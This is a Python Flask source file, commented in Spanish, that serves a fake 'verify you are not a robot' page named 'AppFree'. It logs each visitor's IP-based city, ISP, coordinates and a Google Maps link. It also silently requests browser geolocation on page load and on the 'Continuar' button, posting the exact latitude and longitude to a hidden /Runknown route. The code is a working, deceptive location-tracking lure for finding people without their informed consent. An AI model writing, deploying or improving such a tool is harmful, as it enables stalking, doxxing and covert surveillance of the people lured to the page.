from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

@app.route("/unknown")
def ubicacion():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    # Obtener ubicación aproximada por IP
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = resp.json()
        ciudad = data.get("city", "Desconocida")
        region = data.get("regionName", "Desconocida")
        pais = data.get("country", "Desconocido")
        codigo_pais = data.get("countryCode", "")
        codigo_region = data.get("region", "")
        codigo_postal = data.get("zip", "")
        lat = data.get("lat", "")
        lon = data.get("lon", "")
        timezone = data.get("timezone", "")
        isp = data.get("isp", "")
        org = data.get("org", "")
        asn = data.get("as", "")
        continente = data.get("continent", "")
        maps_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}" if lat and lon else ""
        ubicacion_aprox = f"{ciudad}, {region}, {pais}"
    except Exception:
        ubicacion_aprox = "No se pudo obtener la ubicación."
        ciudad = region = pais = codigo_pais = codigo_region = codigo_postal = lat = lon = timezone = isp = org = asn = continente = maps_url = ""

    # Imprimir todos los datos en consola
    print(f"--------------------------------")
    print(f"🌐 IP: {ip}")
    print(f"📍 Ciudad: {ciudad}")
    print(f"📍 Región: {region} ({codigo_region})")
    print(f"📍 País: {pais} ({codigo_pais})")
    print(f"📍 Código postal: {codigo_postal}")
    print(f"🌎 Continente: {continente}")
    print(f"🕒 Zona horaria: {timezone}")
    print(f"🌐 ISP: {isp}")
    print(f"🏢 Organización: {org}")
    print(f"🔢 ASN: {asn}")
    print(f"📍 Coordenadas: {lat}, {lon}")
    print(f"🔗 Google Maps: {maps_url}")
    print(f"--------------------------------")

    # HTML con botón y geolocalización automática
    return render_template_string(f"""
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>AppFree</title>
        <style>
            body {{
                margin: 0;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                background-color: #2F5078;
                font-family: Arial, sans-serif;
                padding: 1rem;
            }}
            .card {{
                background: #fff;
                padding: 2rem;
                border-radius: 15px;
                box-shadow: 0px 4px 12px rgba(0,0,0,0.5);
                text-align: center;
                width: 100%;
                margin-top: -150px;
                max-width: 400px;
            }}
            h2 {{
                margin-bottom: 1rem;
                color: #333;
                font-size: 1.2rem;
            }}
            p {{
                margin-bottom: 1rem;
            }}
            button {{
                background-color: #4CAF50;
                border: none;
                color: white;
                padding: 0.8rem 1.5rem;
                font-size: 1rem;
                border-radius: 8px;
                cursor: pointer;
                transition: background-color 0.3s;
                width: 100%;
                max-width: 300px;
            }}
            button:hover {{
                background-color: #45a049;
            }}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>Verifica que no eres un robot</h2>
            <button onclick="getLocation()">Continuar</button>
        </div>

        <script>
            function enviarUbicacion(lat, lon) {{
                fetch('/Runknown', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{lat: lat, lon: lon}})
                }});
            }}

            function getLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(function(position) {{
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        enviarUbicacion(lat, lon);
                    }});
                }} else {{
                    alert("Error: Geolocalización no soportada.");
                }}
            }}

            // Intento automático al cargar la página
            window.onload = function() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(function(position) {{
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        enviarUbicacion(lat, lon);
                    }});
                }}
            }};
        </script>
    </body>
    </html>
    """)

@app.route("/Runknown", methods=["POST"])
def recibir_ubicacion():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")

    print(f"📍 Nueva ubicación recibida: {lat}, {lon}")
    print(f"🔗 URL en Google Maps: https://www.google.com/maps/dir/?api=1&destination={lat},{lon}")

    return "Ubicación recibida"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)

